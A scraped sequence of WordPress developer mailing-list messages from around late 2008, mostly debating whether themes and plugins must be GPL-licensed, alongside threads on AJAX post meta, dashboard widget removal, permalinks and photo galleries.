which are worth noting: WP Easy Uploader and WP Developer Assistant. I 
am also working on developing WP-Roadmap.com, a totally free service 
that attempts to help developers by mapping the structure of calls in 
WordPress. Should I now fear having my plugins dropped from the 
repository and having my WP Roadmap site blacklisted because of who I 
work for?

Hey Ozh,

great job. It would also be helpful to incooperate the version information
about hooks and filters found at http://adambrown.info/p/wp_hooks into it.

Yes, I tried to verify if that line had been added or was always their 
but based on what I've read, looks like that was added to the list of 
requirements. Also, I know with David Coveney who started this 
conversation is noting that Matt has told him not to strictly tie this 
event to Automattic as Automattic and WordPress.org or two separate 
entities. I agree with that and it makes me wonder just how intertwined 
the two are? Unfortunately, an event like this that is tied to the 
WordPress.org side of things can easily be blamed on Automattic as 
people think they're all one in the same.

So if this ruling sticks, I see one of two things happening. Either 
premium theme authors adapt and give away themes while selling support 
packages and thus, the WordPress.org team single handedly forces premium 
theme authors to change their business model or, premium theme authors 
will continue to operate without the promotional benefits of links 
within free themes available in the repository. Then again, I think the 
Premium theme market for WordPress has done pretty well outside of the 
confines of the theme repository and the WordPress.org epicenter.

I hate repeating myself, but I'd like for the leader of the project to 
step up and lead and let the followers know that 'this is the way it's 
going to be' and although we might have more things to talk about, at 
least having the leaders perspective and reasoning behind all of this 
would make the entire situation a little clearer.

Wow, this thread kind of ballooned while I was working. I'm going to
reply to several things I just read at once.

Yes, that is absolutely accurate. The GPL doesn't care if you sell a
work, it only cares that the receiver of that work has the same rights
you do, and that the work remains "free as in speech".

I'd say that the definition of "good" in your statement depends on
your point of view. It'd be good for you, certainly.

I dunno. I'm a programmer, and one thing that bugs me a lot throughout
the views of many on the internet is that it is somehow possible to
write one piece of code and sell it forever, making infinite amounts
of money off of it. This sort of comes from the whole writer and
copyright thing, where authors and creative types were suddenly given
an entitlement to make endless amounts of money by granting them
ownership of intangible things. Until the last 100 years, that has not
really been the case for the rest of the history of the species, so
why the change?

Sorry, I kinda just expect to work for my money. I get paid to
program, I don't program something once and then expect to keep
getting paid for it forever.

Actually, that would be an incredibly bad idea, because it's a
lose-lose for my end. If the courts ruled that the author of the
plugin/theme violated the GPL, then he would not have the rights to
distribute that code under the license he distributed it under. In
which case it reverts to the default: his copyright only, nobody else
has rights to distribute it... Result: I lose either way. The only
thing that could happen is that he has to GPL his plugin/theme or stop
distributing it entirely. I still lose and pay damages.

No, the only people who can get a win there are the WP copyright holders.

I have tested with remove_meta_box() and this was not possible.
Maybe your have one idea.

	Through AJAX
Message-ID: <eff2e86c0812121537q7f844933t5415f36ddfe72245@mail.gmail.com>

Hello everyone,
I'm writing a plugin that uses ajax to update a custom set post meta value.
My ajax works correctly, and I am able to update the post meta value (using
the standard update_post_meta function). However, I'm finding that when
saving the post, any updates I have made to that post meta field are lost.

WordPress on a save goes through each of the meta values on a post, and
overwrites the database value with the one returned through $_POST. By doing
this, anything updated in the database since the user last refreshed the
page is lost.

I have through of a couple of different ideas to solve the issue, but
neither are ideal.

My first idea is through an action grab the database value and replace it
with the $_POST value before a save. Unfortunately, there doesn't appear to
be any hooks that run before the post meta values are updated.

The other idea I thought of was to update the post's meta value field
through javascript, so when WordPress saves the post meta, it will replace
it with the correctly updated values. While this will work, I find the
method to be extremely hacky, and I'm thinking there has to be a better way
to do it through PHP.

Surely there has to be some developer out there who is using post meta
values with AJAX and have run into this issue. Does anyone have any better
ideas to deal with this issue?

It does this updating from the posting screen...?

Why not use jQuery to alter/add to the contents of the form items?

The More Fields plugins may have found a way to prevent this. (check
version 1.0, I think previous versions had the bug)

Correct, this occurs from the edit post screen when saving posts.
That is the solution I came up with (solution #2), but there are
some drawbacks to this that make it seem more like a hack.

First off, the data I'm storing in a post meta is serialized, as most of the
data stored is created through PHP. To update the form field, the data would
have to be submitted through AJAX, processed through PHP, returned in
javascript, and updated in the field.

Second, I'm already returning data on my AJAX query, and that data is used
for displaying information to the user. To return the serialized array, I
would have to create a second AJAX query to update the form field.

Again, this idea will work, but it seems way too hacky and not
an elegant solution. I would think there should be to specify in WordPress
that this field may change through AJAX or other means before a post save.
I'm already using an underscore to hide the field from the user, the user
should not have any access to that field, and therefore there should be no
reason for WordPress to assume that is the most current version of the post
meta.

Looking over the More Fields plugin, they appeared to have a different
problem as they're not using AJAX for the actual box updating.

Questions:

What is the technical definition of a derivative work in layman's terms?

Why is a theme considered a derivative work of WordPress, if it is 
released separately, but dependent on WordPress?

People keep saying GPLv2, but why couldn't I release my code new BSD?

I do release my code new BSD, the HTTP API would also be new BSD, if I 
had caught it quick enough. I suppose the issue now is that I would need 
permission from Ryan and DD32 + plus a couple of others in order to 
change the license. The HTTP API can be used separately from WordPress, 
with a few modifications to remove the wp_option code.

(Talk to me like I'm an idiot, because I know nothing)

What version of the BSD license do you use?  The old one is GPL-incompatible
( http://www.gnu.org/licenses/gpl-faq.html#OrigBSD).
I'm assuming you're using the revised BSD, which is okay, since it removes
the advertising clause.

I'd take "new BSD" to mean the revised one, especially as I've seen
Jacob's code, so I know it is.

Due to the fact that it uses WordPress code (i.e. function calls), it is
considered to be a derivative under some people's understanding. The
debate of whether simply making a call to a function makes it a
derivative is what this topic appears to have moved to, however, as Otto
noted, until this is tested in court, we have no way of knowing for sure.

Actually, I'll take it that the HTTP API inherits the GPLv2 from the 
parent, WordPress, since no license is given. I'm unsure if the API 
would have been considered if it was anything other than GPLv2. However, 
I would rather like that people use it outside of WordPress, but the 
license might be too restrictive for some projects. Well, the Zend 
Framework also implements a lot of what the HTTP API does, so really you 
could use the Zend Framework under its New BSD license.

I'm not a lawyer, Feel free to correct me if i'm wrong.

>Questions:

> What is the technical definition of a derivative work in layman's terms?

A Derivative work is a work which cannot exist without the GPL'd parent,
WordPress Themes and Plugins are Derivative works since they do not function
without WordPress (They -must- call things like add_action() and
add_filter() in order to work (for plugins), Or they' call WordPress
Template functions (themes)

The GPL makes more sense for compiled items, It can be a bit harder to apply
it to interprated languages such as PHP, but it remains the same once you
decide how you define certain terms of the license, Its still being debated,
But a consensus among some people, has come to the conclusion that Its
Derivative if it cannot operate seperate from the GPL project by itself
(This is the interpratation that I personally believe, but this isnt about
my thoughts). Another group of thinkers, base the fact that a Plugin or
Theme is NOT a derivative work due to the item using the API provided(ie.
template functions, *_filters, *_action) and therefor while linking to, it
does not actually access directly, or something.. Something about WP calling
the plugin/theme, and not the theme calling WP, That school of thinking
mearly didnt make sense to me, thus my POV.

> Why is a theme considered a derivative work of WordPress, if it is
released separately, but dependent on WordPress?

Because it relies upon WordPress, A Derivative work does not need to be
distributed with the parent, mearly rely upon it.

> People keep saying GPLv2, but why couldn't I release my code new BSD?
I dont have any opinion on this, As i do not know anything about the BSD
Licence.


> I do release my code new BSD, the HTTP API would also be new BSD, if I had
caught it quick enough. I suppose the issue now is that I would need
permission from Ryan and DD32 + plus a couple of others in order to change
the license. The HTTP API can be used separately from WordPress, with a few
modifications to remove the wp_option code.

Since it relies upon apply_filters() and get_option(), etc, WordPress
function, It'd need to stay GPL-Compatible, I'm not sure if this means it
would have to allways be GPLv2 or whatelse, But dual-licenced code is
allright.


Now, So, How to commercial projects such as (using this as a pure example)
Bad Behaviour still operate as plugins (legally)?
Bad Behaviour is a 2 step process, Theres the core library (Which is not GPL
compatible AFAIK), and then theres the WP plugin, The plugin is dual
licenced to GPL and something else (BSD I suspect?), The Plugin relies upon
WordPress and the BH Library (So it must be GPL), The BH library, Does not
rely upon WP at all, Infact, It never calls anything in WordPress directly.
The plugin is the part that does the work, It accepts data from WordPress,
Calls the BH library if need be, and returns the result back to WP, That way
BH is never directly relying upon WordPress, and therefor, can be
GPL-non-compliant.

This is all an AFAIK, The problem with licenses, Is that the majority of us
are not lawyers, and while we think we may understand the license, that
doesnt mean we do; Until its tested in court properly, I dont think there
will be anything to base it off..

You could actually make a theme that wouldn't be a derivative. By not
using any template functions, and "simply" getting everything directly
from the database. Which would mean it could operate without WordPress
(it would need a WordPress-styled database, but that really has
nothing to do with licenses) and would not be a derivative. That
would, of course, be a PITA, but you could do it if you wanted to sell
a non-GPL-compat theme.

The FSF makes specific distinction of templates from the application.
http://www.gnu.org/licenses/gpl-faq.html#WMS

Both Joomla! and Drupal use the SFLC's guidance and have made statements
that suggest the HTML portion of the template would considered an extension
of the application, but the Javascript, CSS, and images are "data" (as
described in the FSF FAQ) and not extensions of the core code, and therefore
not subject to the same licensing requirements as the core code.

Having said that, this is certainly a gray area, IMO, and is something each
community may decide differently. Personally, I would love to see some
consistency across project boundaries as it would help everyone understand
expectations a bit more clearly.

Also, I think it's really important to separate "code/GPL issues" from
discussions about "what is allowed on property." Those are very different
issues. The word "community" gets bantered about a bit without definition
and sometimes that, too, clouds discussion.

When it comes down to it, it is really important to remember that the GPL
does not entitle more than liberty with the code and it only necessitates
compliance when distributing code.

Policies that custodians establish for their Web site resources and any
methods they choose to use for decision making, communication, and
enforcement are very separate issues. I think one is wise to not assume they
are "entitled" to anything unless there is a contract or a business
arrangement in place.

The GPL and community arrangements are wonderfully fragile and yet strong
working environments. No one is in charge of you and you are not entitled to
anything from them -- other than the requirements of the GPL and any legally
binding business arrangements made. What that does is call into play things
like reputation, relationships, behavior, networking, skill, and in doing so
creates an environment with incredibly low barriers to entry. Great
opportunities, few guarantees, no one standing in your way.

I think in discussions like this, it is assumed IANAL - if you are one -
then you should probably so announce. ;-)

If you'd just like to remove it for yourself, You can deselect it in the
"Screen Options" tab at the top of the Dashboard.

If you want to remove it entirely, I'm pretty sure remove_meta_box() should
work, It might be you're passing it the wrong args, add_meta_box() works for
the dashboard i'm pretty sure.. so i dont see why remove_meta_box() wouldnt.

There is still disagreement, even within the FSF, over whether a simple API
call creates a derivative work. Some GPL projects take the position that it
does, some take an opposite view. Both are right in terms of their own
projects because the copyright holder has the right to enforce their license
as they see fit (although, keeping within the clear terms of the GPL
itself). Without case law to determine exactly what makes a derivative work
the debates over GPL are going to continue to take up far more time than
they should, and cause more angst in FOSS communities. Shame.

Templates have traditionally been seen as outside the scope of the GPL.
See: http://www.gnu.org/licenses/gpl-faq.html#WMS

WordPress themes usually consist of (X)HTML, CSS, images, and often include
JavaScript. They do not necessarily use the JavaScript libraries that are
included within WP (which are not GPL anyway). Many WP themes can also stand
alone as static HTML templates simply by removing the WP functions. I
suspect many are even designed at the outset as static templates with the WP
function calls added later. It's also possible to build a WP theme without
using any WP function calls at all, by using functions.php as a bridge
between WP and the theme.

IANAL, and am also not a seller of WP themes, but I do not believe that WP
themes are necessarily derivative or have to be licensed under the GPL. A
clear position statement by WP.org would clear matters up so everyone knew
where they stood.

Please correct me if I am mistaken, but does it mean that there can be 
no *free* (as in freedom) products for Windows? Because any Windows app 
has to call Windows API. But that does not mean that the calling 
application is derivative work from Windows. And it uses license 
different from that Windows does.

"A clear position statement by WP.org would clear matters up so everyone knew where they stood."

Couldn't agree more. I've talked with a number of theme developers so far and also I've seen on the BlogHerald that more news about the theme removals will be published soon. My hope is that this news includes a post by Matt where he clearly states what the guidelines are, where he and the project stands in terms of GPL and what will and won't be tolerable for themes that opt to be paid for. At least then, we will have something to fall back on and perhaps much of the waters surrounding themes and GPL will become a much  less talked about debate.

The "Derivative works must be under a compatible license" clause is of the
GPL. Since windows is not under the GPL license, then thats ok.

If the windows License included "Your first born son will hereby become
property of Microsoft" then that would be a legal clause (However, note that
i doubt it'd hold up in court :P), since the windows license doesnt force
itself onto derivative works or programs which run on windows, its not a
issue.

Microsoft licenses its IP in really convoluted ways. Some is free to use,
some is not, some have really weird requirements. There is a general
overview here: http://www.microsoft.com/iplicensing/FAQInformation.aspx

Basically though, Microsoft is the same as any software copyright holder -
they can license their own work however they choose and can make it
available for others to use and/or develop on under any terms they choose.

There are apps that use a Microsoft API and that are licensed LGPL (probably
some GPL ones too - I just can't recall any at the moment) but its the code
that runs on top of the Microsoft API that is LGPL, not the API itself.

The Microsoft example, though, is a really good one for the argument that
simply hooking into an API does not, in itself, create derivative work.
(This is the position that is taken by the Mambo CMS project too - which is
GPL version 2).

I think this discussion of whether calling functions makes a 
derivative work or not misses the point.

The point being (IMHO), I have never seen a WP theme that wasn't 
written using the standard Loop code either from the Codex or from 
another theme.

Therefore these themes are all created by incorporating/modifying GPL 
code, and they are therefore derivative works and therefore GPL.

In my non-binding, non-lawyer opinion.

The Loop is more the principles of PHP put to work, than using
"prewritten" code. Either way it's going to come out similar.

That is exactly the point of disagreement. Using the loop, or calling
functions from outside the loop does not necessarily result in derivative
code. See this for a lawyer's point of view:
http://www.linuxjournal.com/article/6366

I tend to rely on the FSF position that: *"These requirements apply to the
modified work as a whole. If identifiable sections of that work are not
derived from the Program, and can be reasonably considered independent and
separate works in themselves, then this License, and its terms, do not apply
to those sections when you distribute them as separate works." *  In a
complex theme, there may be perhaps 1000 lines of code with only a tiny
fraction of this code being calls to the_post, the_title, etc. and the rest
being JQuery, HTML, and custom PHP. Remove the WP template tags and its
entirely possible to have a functional static template using the same code.
These are, IMO, identifiable sections of the work that are clearly not
derived from the Program and therefore are not required to be licensed under
GPL.

However, in the greater scheme of things this is really not important. What
is important is that action has been taken that affects theme developers and
an explanation of the rationale for this has not yet been given. WP.org can
do what it likes with its own site however WP is a community project and it
would be nice to be kept informed.

I find myself in a position to agree with Otto's opinion, if it doesn't do
anything without WordPress then it should be considered derivative work. I
do not base this on any laws as I am not a legally knowledgeable person. I
base this idea purely on the morals that caused free software to come into
existence in the first place. The spirit of free software says that code
should be free, people who take advantage of a free software source like
WordPress, making new code specifically for it but locking up said code with
copyright, are violating the spirit of free software even if it turns out
that it is legal.

The simple truth is that they are coding with propriety goals but tryin to
avoid proprietary costs by exploiting free software. If you have proprietary
goals you should use proprietary software, if you use free software you
should use free software models, such as the long standing act of giving
away the software and selling support, or coding specific functions for
'sponsoring parties'. There are ways to make money with free software, they
just differ from the model that most of us have been taught.

That said, I not only fully support the decision to drop these themes, I
applaud it. Between this decision and the massive improvements in WP 2.7 I
am quite happy with WordPress.

I'm reminded (not so subtly) of the current roiling turmoil in the US (and
world) financial markets.  Much of the chaos can in fact be attributed to
the US gov't not taking a clear stance on the actions they were prepared to
take nor how they even viewed the situation.  The more the uncertainty, the
greater potential risks for investors and thus the likelier for mass
withdrawal from the marketplace into "safer" vehicles.  The longer WP.org
staff, Automattic, et al. allow these sorts of issues to fester, the longer
the WordPress theme/plugin "markets" will be riven with sniping, speculation
and far-outsized commentary.
So Matt, Lloyd, etc. -- a few soothing or explanatory words, early-deployed,
would go a long way towards preventing this sort of hyperventilation in the
future while a statement in re: commercially-sponsored GPL'd themes would
tamp the current situation down right well.

Just my (2 Euro/100) * (Current EUR-USD exchange rate).

I have a lot of users and they don't need to see all the WordPress development stuff in the dashboard, so i'm simply hiding them with a little css that's in an admin_head action:

This is global for all users and doesn't mess with their user_meta options. This will also remove the help and options expandable menus in the dashboard since my users need to come to me instead of to the WordPress forums for help.

<style>
	
	#dashboard_incoming_links, 
	#dashboard_plugins, 
	#dashboard_secondary, 
	#dashboard_primary, 
	#contextual-help-link-wrap,

wp_add_dashboard_widget( 'dashboard_quick_press', __( 'QuickPress' ),
'wp_dashboard_quick_press' );

and in the function wp_add_dashboard_widge was used the function add_meta_box
add_meta_box( $widget_id, $widget_name , $callback, 'dashboard',
$location, 'core' );

now i have write a small test in a plugin:
function mytest() {
	remove_meta_box('dashboard_quick_press', 'dashboard', 'core');
}

add_action( 'admin_menu', 'mytest' );

Thanks, works now, i have test with the false id :(
Best wishes and thank you

Is WordPress a derivative work of PHP? It cannot function without it.

According to the GPL FAQ from the FSF: 
<http://www.gnu.org/licenses/gpl-faq.html#LinkingWithGPL>

How can I allow linking of proprietary modules with my GPL-covered 
library under a controlled interface only?

     Add this text to the license notice of each file in the package, at 
the end of the text that says the file is distributed under the GNU GPL:

         Linking ABC statically or dynamically with other modules is 
making a combined work based on ABC. Thus, the terms and conditions of 
the GNU General Public License cover the whole combination.

         In addition, as a special exception, the copyright holders of 
ABC give you permission to combine ABC program with free software 
programs or libraries that are released under the GNU LGPL and with 
independent modules that communicate with ABC solely through the ABCDEF 
interface. You may copy and distribute such a system following the terms 
of the GNU GPL for ABC and the licenses of the other code concerned, 
provided that you include the source code of that other code when and as 
the GNU GPL requires distribution of source code.

         Note that people who make modified versions of ABC are not 
obligated to grant this special exception for their modified versions; 
it is their choice whether to do so. The GNU General Public License 
gives permission to release a modified version without this exception; 
this exception also makes it possible to release a modified version 
which carries forward this exception.

     Only the copyright holders for the program can legally authorize 
this exception. If you wrote the whole program yourself, then assuming 
your employer or school does not claim the copyright, you are the 
copyright holder?so you can authorize the exception. But if you want to 
use parts of other GPL-covered programs by other authors in your code, 
you cannot authorize the exception for them. You have to get the 
approval of the copyright holders of those programs.

Actually, the PHP license is not GPL compatible, it has a clause that 
says that no software written in PHP can use the word 'PHP' in the name 
of the software. "phpBB" violates this clause as well as phpNuke, etc. 
The issue is more that PHP doesn't want to be associated with poorly 
written web applications which have security flaws to be attributed to 
the PHP language itself.

PHP itself is not inherited insecure, so when people assume that 
something that has PHP written is associated with the PHP development 
group, then it caused some confusion on whether the fault is PHP or 
programmers with no education or experience creating software and with 
no security in mind.

In a sense, I think it is more New BSD with the extra clause, but I've 
only briefly read it and not for any extend periods of time.

 From that article:

***
1) The primary indication of whether a new program is a derivative 
work is whether the source code of the original program was used, 
modified, translated or otherwise changed in any way to create the new 
program. If not, then I would argue that it is not a derivative work.
***

So if they start from a GPL theme as a starting point, and then use 
and modify that source code, it is a derivative work. Right?

You are mistaken.  Windows isn't under the GNU GPL.  If you write software
the is dependent on parent software to run (ie a WordPress plugin or theme)
and that parent software is GPL, then the child software must inherit the
GPL license.  You agree by these terms when you use the parent software.
This doesn't apply to software under other licenses, like Windows.


Michael

Please correct me if I am mistaken, but does it mean that there can be
no *free* (as in freedom) products for Windows? Because any Windows app
has to call Windows API. But that does not mean that the calling
application is derivative work from Windows. And it uses license
different from that Windows does.

I'm familiar with the two link styles, but am trying to determine  
where google learned of the combined version of the URLs. In other  
words, if your blog isn't publishing links with the friendly URL and  
the querystring in it, google had to learn of those links some where.

Do you have any plugins publishing an XML site map or anything like  
that? Do they contain those type of links?

You (the OP) can find out which pages are linking using the /?p=xy
format using the "Linked from" attribute of the Google Web Master Tools
table.

If they're under your control, you ought to change them. If they're
under your control and you've already changed them, allow a few days for
Google to re-crawl your site and update its indexes.

I almost always agree with Lawrence Rosen, but on this one he's really
stating more of how he thinks it should be rather than how it
currently is. Note he used the phrase "Here's how I would decide in
the cases described above." I'd say that case law on this sort of
thing, such as it is, doesn't generally back up his opinion here.

I would agree that themes should generally not be held to be
derivative works. However, given the current law, my opinion is that
they are. Of course, that's only my opinion, and I doubt anybody is
going to be pursuing anybody for selling non-GPL'd themes anytime
soon.

For those in doubt on this issue, let me restate something I said
earlier that might have gotten overlooked: All of our opinions are
basically meaningless. The only opinion here that matters is that of
the copyright holders of WordPress. Since it's a collective work, that
would be the core commit team's opinion, basically. Only they have
standing to sue anybody for WordPress license violations. Only they
can take it to court. From what I've seen and the direction things
appear to be taking, that seems unlikely to me. They appear to be
using the carrot, not the stick.

So really, anybody making premium themes shouldn't worry much about
that. However, I still think that if you make a premium theme, you
should not expect to get any theme listed on wp.org. That's only my
opinion, of course, but if you're making a business without really
contributing anything back, then why should you get free promotion
from the core? Makes no sense to me. Of course, if your themes are all
GPL-compatible and you sell support or custom theme services, then by
all means, you should have them listed. The idea is to sell service
and support, not software.

Hi:

In wp versions lower than 2.7 I had an index.html and an index.php in
the root directory of my blog without problems.

My frontpage page, index.html, had a link to /index.php which allows to
browse my blog.

In wp 2.7 the index.php always redirects to / and then my visitors
cannot browse my blog.

Can I remove this wp 2.7 issue??

Thanks to ChrisThomson!

This changeset http://trac.wordpress.org/changeset/9203 caused all my
worries.

By undoing it all works fine again.

Thanks!

If you start with a GPL theme, there's no question that modifying it
constitutes a derivative work. Same as if you took WordPress and
modified it, that would also be a derivative work.

Sure ...

If I have 12 for sale, and offer 1 free ...

To answer Eric's question first, I did briefly use the Google Sitemaps 
plugin, but as my site had still not been indexed a couple of weeks 
after making the move to WordPress, returned to the more thorough 
sitemap generator at auditmypc.com.

Harish, I'm not sure where to find "Linked From" in Google Webmaster 
Tools. Are you talking about the "Link" section under Index Stats?

I'm afraid this just leads to more questions from me, as I'm new to 
WordPress. As I understand it, both the default links and the friendly 
urls (Permalinks) are out there, and I presumed Google would index them 
all. In fact, because I know those default links will never change 
(while the friendly urls could conceivably change to anything the 
operator chooses), I have used the default urls for my internal links.

If I'm in error here, please correct me. These are critical issues I'd 
like to work out while the site is still "new."

One further clarification. I was dismayed to see my site, whose presence 
I had developed over more than two years, drop completely off the Google 
map shortly after I made the (necessary) changeover to WordPress. Google 
only has begun re-indexing the site over the past couple of days. At 
this point, most of the information in my Google Webmaster Tools still 
relates to the old, defunct, links.

Thanks to all for your assistance!

You will now be left with a table with attributes:
URL   Detail   Linked From   Problem Detected On

For every broken URL listed, you can figure out which pages are pointing
to it. A link style of yoursite.org/bar/date/foo/?p=23 (or whatever)
sounds fishy.

I would suggest you pick a human-readable URL style that you will never
change in the future. As useful as /?p= style links are, human beings
will probably never use them, so in essence even your 'friendly URL'
style is frozen. Choose wisely and keep it fixed.

Give it a week or two for it to re-index and correct itself. Try not to
panic by checking GWMT (Google Web ...) too frequently. If it still
bothers you, you could try to use one of the many site map generating
utilities with your nice, new URL layout (there's probably a plug-in for
it) and submit it to nudge Google along.

Lots of helpful information there. I've used your method to correct a 
lot of the bad urls, so the site's looking a bit better.

On this one highlighted point, my question would be, is it OK -- 
Googlewise -- to use the default (/?p=) style for internal links, 
knowing that they will be forwarded to the friendly urls by the 301 
redirect in my .htaccess file?

Or am I creating a redundancy problem for Google by allowing friendly 
url Permalinks while I continue to point to those default urls?

It is not a technical problem (either for Google or for WordPress), but
have you thought about why you want to do this?

If I (a third person) were to link to your site, I'd always prefer a
human-friendly URL given the choice. You want to subject my links (and
every other incoming link) to a 301 redirect (which implies the page has
been moved permanently) just so (I think) you can satisfy some internal
(in your head) notion of good link canonicalisation (which is probably
not a real word). You should start thinking of /?p= as a technical
detail (something you should not bother humans with) and not as
something inherently canonical (or good, or pure, or ...).

Do you really want unique pages on your site to be linked-to via
non-unique URLs (human-friendly by me, /?p= internally, /date/ by
someone else etc.) just because you know technology won't be confused?

If a GPL'd theme is used as a starting point for a theme then the new theme
is derived from the original and must also be licensed under the GPL, using
the version permitted by the original theme.

FWIW, there are not many themes on WP.org that actually comply with the GPL.
The GPL requires that developers must conspicuously and appropriately
publish on each copy distributed an appropriate copyright notice and
disclaimer of warranty and keep intact all the notices that refer to this
License and to the absence of any warranty; and give any other recipients of
the Program a copy of the GNU General Public License along with the Program.
Few themes provide this. Some themes place additional restrictions, such as
leaving footer links, and these breach the GPL. Some are released under GPL
with the proviso that the theme cannot be sold - again, this breaches the
GPL because the GPL permits them to be sold (not just by the developer
either).

There is at least one theme there that is licensed under GPL3 (
http://wordpress.org/extend/themes/wpfolio#post-716), yet GPL3 is not
compatible with GPL2 and cannot be used with GPL2. WordPress is GPL2.

Hopefully, when Matt & co. release their statement about the changes to the
themes repository they will also make it clearer about what they expect from
theme developers because at the moment there seems to be a whole heap of
confusion.

Message-ID: <c6c45a350812140331n5f8732afjc4b93d0a373972c3@mail.gmail.com>

Firstly let me direct you to a few sites:
http://blackwidows.co.uk/blog/2006/11/03/tabindex-at-your-peril/
http://www.webaim.org/techniques/keyboard/tabindex.php
http://www.access-matters.com/2006/08/27/quiz-tabindex-disorder/

and from my comment on one of those:

One thing that sticks out a mile is this "disorienting for the (screen
reader) user". Once again it has been assumed that the only people who
navigate a website via the keyboard is a screen reader user. This is
not the case, I know many people who prefer to use the keyboard, or
are in fact forced to because they are unable to use a mouse. If the
tabbing index does not follow the flow of the page then it becomes
very disorientating. You have to visually try and 'guess' where you
are.

and that was from over 2 years ago.

So my question - is it time to drop tabindex from the Wordpress core?

?It would not be interesting to revert this changeset??

This it is important for those that we have an index.html and an
index.php in the / directory...

What do you think, hackers??

Why do you need an index.html in the first place? You could have a
home.php in your theme directory instead.

Yes, this is a possibility.
A i think this not a good idea. Example: the widget Quickpress give
the users rights to write a post and maybe i dont like this. Also load
you with this possibility all code and the you deactivate via css.
WIth a little bid informatin about firebug oder Webdeveloper-toolbar
in Firefox it is possible to active the widgets.

?I think it does not matter what I have in the first place or how my web
page is.

The matter is that this changeset fixes tickets 5017 and 7173 but it
causes a lot of problems to many people like me.

Not is a good changeset.

Cheers.

I agree. Having two index files can cause issues with SEO and a home.php can
be a template that is completely different to index.php. If the index.html
is a static HTML file you can easily make this into a home.php template
which will be the first page to load when visitors go to your domain.

However, changing this behaviour between 2.6.5 and 2.7 without warning was
probably not a good idea. There are a lot of sites that use both an
index.html and index.php and this changeset will catch a lot of people out.

If you don't want users writing posts, then you shouldn't give them the
capability to do so. Removing the dashboard widget won't stop them from
going to the Write Post screen.

I have been removing tabindex from the core files for years, whenever I have
developed a site for someone who has accessibility issues. If it was removed
from the core this would save me some work ;)

It give users she use WordPress for more as write a post. I have write
a plugin to deactivate areas and menu-points in the admin. I set this
for the different userrights.
I will reduce the admin at only the functions for the users - how the
user this used.

This is not correct. The GPL is all about distribution and simply using GPL
software does not mean that anything you develop to work with it must be
GPL. The output of GPL'd code is not covered by the license, only the source
code itself is. So, if you use WordPress source code in a plugin or theme
then the plugin or theme must be GPL version 2, the same as WordPress.
However, simply combining PHP code with a WordPress function call may not
necessarily mean that a theme or plugin must be GPL. There are two opposing
schools of thought on that issue and neither is wrong - there simply is no
case law to establish whether using a function creates a derivative work.

Then, to make matters more complicated, the GNU/GPL recognises "fair use".
Some themes comprise templates that are made up of hundreds of lines of HTML
and custom PHP, with only a few lines for the loop, for example, and these
may fall under fair use laws. Fair use does not require that the work is
licensed GPL.

If you use your argument that software that is dependent on parent software
to run must inherit the license of the parent then every webpage would be
under the Apache (or other server software) license and all PHP code would
be using the PHP license. This simply does not hold true.

You also do not have to agree to anything when you simply use GPL code. The
license imposes obligations when you modify and/or distribute the code but
agreement is not part of the GPL. Of course, you only have the right to use
the GPL'd code under the terms of the license.

Theres more information in the GPL FAQ here if you are interested:

I DO want my users writing posts  and if I'm not mistaken, my code doesn't
remove the quickpress widget.

I'm not worried about a user activating the widgets with firebug because: 1.
They're using IE7, and 2. If they're sophisticated enough to do this more
power to them. I'm not trying to completely hide the software we're using,
but make it so that users don't get overwhelmed by information that they
don't necessarily need to see.

Lynne - we might want to exit these discussions.

I'm just remembering what we went thru in the Joomla! community 1 1/2 years
ago. Personally, I'm pleased with the result but I don't think we could have
done more damage with the manner in which we handled it. I know that people
coming in from the outside made things far more challenging. So, I apologize
for responding.

I love Karl Fogel's <http://www.red-bean.com/kfogel/> book Producing Open
Source Software <http://producingoss.com/>. He has remarkable insight into
communities. His section entitled Avoid Holy
Wars<http://producingoss.com/en/common-pitfalls.html#holy-wars>is
something I wish we had paid attention to in Joomla! when we had our
GPL
talks.

You all have much to be proud of - WP is remarkable software. In many ways,
it is "the standard" for usability that we all use as we develop solutions.
I know from prior discussions with Lynne, she also has deep respect and
admiration for this platform.

Keep driving forward, folks.

/me goes back to coding cool stuff for Joomla!

Message-ID: <ae81acd10812140724w5600c188x894bc5d515991443@mail.gmail.com>

I have a gazillion of family pics to put online. A few years ago I was
using Coppermine, but today is it still worth it? With the way WP now
can handle uploads and media etc, do you still use something external
like G2 or anything else?
Thanks in advance for any advice

Would that not depend on a lot of things?
Wordpress is still going to be organized by blog entries.  If you want to
search photos on keywords, not just events, if you want to look for dog
photos, and cloud photos and photos of Bobbie, as well as being able to go
to the post about the birthday party, then you need photo gallery software.
  If not, then I would presume, not.

Message-ID: <57a05ee0812140734v6c6d2544gae972212e6434dfd@mail.gmail.com>

Hi fellow mailing list members,

This is my first message. Forgive me for mistakes.

I want to bring to light the problems I encounter with something as
simple as adding pictures to my blog. The media uploader is simply the
worst part about the very nice wordpress. Its very complicated looking
and takes time to load. For something as useful as putting in pictures
on your blog, more importance should be given to adding pictures on
your blog.

It was not working with the "PressMe" feature in wordpress too... I
suggest here, that there be an image upload option right on the page
itself. I know many of you would complain how this would add clutter.
But then these days blog-posts without images aren't interesting to
read. If you have experienced this yourself...

Suggestion: Please add an upload link right on the new-post page. No
need to load something further to do so... I am very unsatisfied with
the "Media Uploader". I am an experienced blogger, so I am confident
about what I say.

Thanks,
Param Aggarwal

I still use an external gallery package.  Currently using Zenphoto.  I
am working on putting up a family blog and gallery and have chosen to
stick with Zenphoto for my gallery.  The one nice thing that Zenphoto
offers that WordPress doesn't is being able to upload the images via
ftp/scp/etc... and have the automatically loaded into the gallery.
This is the big thing for me because I don't like tying up a browser
that will end up consuming a lot of memory when trying to upload
several hundred photos at a time.

Gallery2 is way too bloated and slow in my opinion.  There are some
Zenphoto WordPress plugins, so you may be able to tie those 2
together.  Although I haven't looked into using them.

Hi,

I believe Wordpress cant handle your 'gazillion' of pics... it would
be too tedious to upload them. I am anyways very unhappy with the
media uploader. And how can u put up galleries in a blog. Your viewers
would love to see a separate dedicated page for your gallery. You can
give more importance to the ability to search and organise them. Put
in captions etc.

And you can use some plugin to show some of your pics on your blog
too... Hope I convinced you...

There are several plugins around - I use a (modified) version of 
ImageManager plugin, and have an icon added to the TinyMce editor, so 
when writing a post clicking the icon you can insert or upload pictures, 
organise in folders, and then insert pictures into your post in a number 
of ways (thumbnail with/without link, picture, size control etc...)
(I haven't checked out WP2.7 yet, but think it does not offer all these 
things as standard!)

Greetings all and Happy Holidays!

So what is the proper method for killing your own old not supported  
anymore plugins from the wordpress.org repository? I currently have 2  
that have not been updated for a few years. They are based on old WP  
2.0 code and really are no longer needed. I'd like to get these  
removed. What is the process?

From: http://gplv3.fsf.org/wiki/index.php/GNU_General_Public_License_version_2

